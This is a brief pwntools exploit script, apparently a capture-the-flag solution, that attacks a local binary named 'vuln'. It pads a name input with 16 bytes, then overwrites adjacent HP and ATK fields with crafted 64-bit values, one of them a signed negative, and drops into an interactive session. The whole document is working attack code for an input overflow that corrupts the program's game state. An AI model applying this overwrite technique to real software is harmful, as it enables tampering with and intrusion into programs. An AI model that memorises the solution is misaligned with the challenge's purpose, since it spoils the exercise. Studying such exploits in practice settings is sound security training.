from pwn import *

io = process("./vuln")

payload = b"A" * 16  # name
HP = 0x1234567812345678 # どんな大きい値でもいい
payload += p64(HP)  # HP
payload += p64(-HP + 110, signed='signed')  # ATK

io.sendlineafter("Input name: ", payload)
io.interactive()
